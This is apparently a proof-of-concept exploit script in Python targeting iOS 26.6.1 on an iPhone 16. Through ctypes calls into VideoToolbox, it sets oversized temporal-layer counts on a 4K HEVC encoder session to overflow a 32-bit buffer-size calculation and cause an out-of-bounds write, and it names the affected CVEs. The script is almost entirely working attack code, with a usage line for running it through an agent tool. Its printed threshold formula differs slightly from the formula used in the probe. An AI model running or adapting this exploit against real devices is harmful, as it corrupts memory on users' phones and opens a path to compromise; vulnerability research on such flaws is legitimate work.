"""
AVEVideoEncoder NTL-based DPB overflow PoC — iOS 26.6.1, iPhone 16
Targets CVE-2026-112466 / CVE-2026-112468..112470 / CVE-2026-112689

Root cause (revised):
  26.6.1 computes DPB buffer size as (frame_unit_size × NTL) in 32-bit arithmetic.
  For 4K HEVC (3840×2160), frame_unit ≈ 2,088,960 bytes.
  With NTL ≥ 2056: product overflows → under-allocated DPB → OOB write on encode.

  Exploitable window (26.6.1): NTL in [2056, 16462]
  - Below 2056:  no DPB overflow
  - 2056–16462:  DPB 32-bit overflow → OOB write (these 5 CVEs)
  - 16463+:      linked-list crash (CVE-2026-112705, 27.0.1-only, different path)

  Fix (27.1/26.7.2): 19 new standalone overflow checkers using 64-bit arithmetic.

Usage: run via offload_python MCP on iPhone 26.6.1.
"""
import ctypes as C

CF = C.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
VT = C.CDLL("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox")
CV = C.CDLL("/System/Library/Frameworks/CoreVideo.framework/CoreVideo")

CF.CFNumberCreate.restype = C.c_void_p
CF.CFNumberCreate.argtypes = [C.c_void_p, C.c_int, C.c_void_p]
CF.CFRelease.argtypes = [C.c_void_p]
kCFNumberSInt32Type = 3

def cf_num(v):
    n = C.c_int32(v)
    return CF.CFNumberCreate(None, kCFNumberSInt32Type, C.byref(n))

VT.VTCompressionSessionCreate.restype = C.c_int32
VT.VTCompressionSessionCreate.argtypes = [
    C.c_void_p, C.c_int32, C.c_int32, C.c_uint32,
    C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p,
    C.POINTER(C.c_void_p),
]
VT.VTSessionSetProperty.restype = C.c_int32
VT.VTSessionSetProperty.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p]
VT.VTCompressionSessionInvalidate.argtypes = [C.c_void_p]

class CMTime(C.Structure):
    _fields_ = [("value", C.c_int64), ("timescale", C.c_int32),
                ("flags", C.c_uint32), ("epoch", C.c_int64)]

VT.VTCompressionSessionEncodeFrame.restype = C.c_int32
VT.VTCompressionSessionEncodeFrame.argtypes = [
    C.c_void_p, C.c_void_p, CMTime, CMTime, C.c_void_p, C.c_void_p,
    C.POINTER(C.c_uint32),
]

CV.CVPixelBufferCreate.restype = C.c_int32
CV.CVPixelBufferCreate.argtypes = [
    C.c_void_p, C.c_ulong, C.c_ulong, C.c_uint32, C.c_void_p,
    C.POINTER(C.c_void_p),
]
CV.CVPixelBufferRelease.argtypes = [C.c_void_p]

kHEVC = 0x68766331  # 'hvc1'
kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange = 0x34323076

CALLBACK_TYPE = C.CFUNCTYPE(None, C.c_void_p, C.c_void_p, C.c_int32, C.c_void_p, C.c_void_p)
@CALLBACK_TYPE
def output_cb(*a): pass

WIDTH, HEIGHT = 3840, 2160  # 4K — well within VT limits


def probe_ntl(ntl):
    """Test one NTL value. Returns: 'ok', 'rejected', or 'crash'."""
    # Overflow estimate for this NTL
    ctu_w = (WIDTH + 63) // 64
    ctu_h = (HEIGHT + 63) // 64
    unit = ctu_w * ctu_h * 1024
    product_64 = unit * ntl
    product_32 = product_64 & 0xFFFFFFFF
    overflow = product_64 >= (1 << 32)

    sess = C.c_void_p(0)
    st = VT.VTCompressionSessionCreate(
        None, WIDTH, HEIGHT, kHEVC, None, None, None, output_cb, None, C.byref(sess)
    )
    if st != 0 or not sess.value:
        return f"session_create_fail({st:#x})"

    ntl_key = C.c_void_p.in_dll(VT, "kVTCompressionPropertyKey_NumberOfTemporalLayers").value
    ntl_val = cf_num(ntl)
    st2 = VT.VTSessionSetProperty(sess.value, ntl_key, ntl_val)
    CF.CFRelease(ntl_val)
    if st2 != 0:
        VT.VTCompressionSessionInvalidate(sess.value)
        return f"ntl_rejected({st2:#x})"

    # Create pixel buffer (4K is fine — ~12 MB)
    pbuf = C.c_void_p(0)
    st3 = CV.CVPixelBufferCreate(
        None, WIDTH, HEIGHT,
        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
        None, C.byref(pbuf),
    )
    if st3 != 0 or not pbuf.value:
        VT.VTCompressionSessionInvalidate(sess.value)
        return f"pixbuf_fail({st3:#x})"

    pts = CMTime(value=0, timescale=90000, flags=1, epoch=0)
    dur = CMTime(value=3000, timescale=90000, flags=1, epoch=0)
    info = C.c_uint32(0)
    st4 = VT.VTCompressionSessionEncodeFrame(
        sess.value, pbuf.value, pts, dur, None, None, C.byref(info)
    )
    CV.CVPixelBufferRelease(pbuf.value)
    VT.VTCompressionSessionInvalidate(sess.value)

    overflow_str = f"OVERFLOW→{product_32:#x}" if overflow else f"no_overflow({product_64:#x})"
    return f"encode_st={st4:#x} {overflow_str}"


print(f"4K HEVC NTL overflow ladder — {WIDTH}x{HEIGHT}")
print(f"DPB unit estimate: {(WIDTH//64+1) * (HEIGHT//64+1) * 1024} bytes")
print(f"Overflow threshold: NTL ≥ {(1<<32) // ((WIDTH//64+1) * (HEIGHT//64+1) * 1024)}")
print()

# Ladder: safe baseline, then ramp toward overflow threshold
for ntl in [1, 100, 500, 1000, 2000, 2056, 2100, 2500, 3000, 4096, 8192, 16000, 16462]:
    result = probe_ntl(ntl)
    print(f"  NTL={ntl:6d}: {result}")

print("\nDONE")
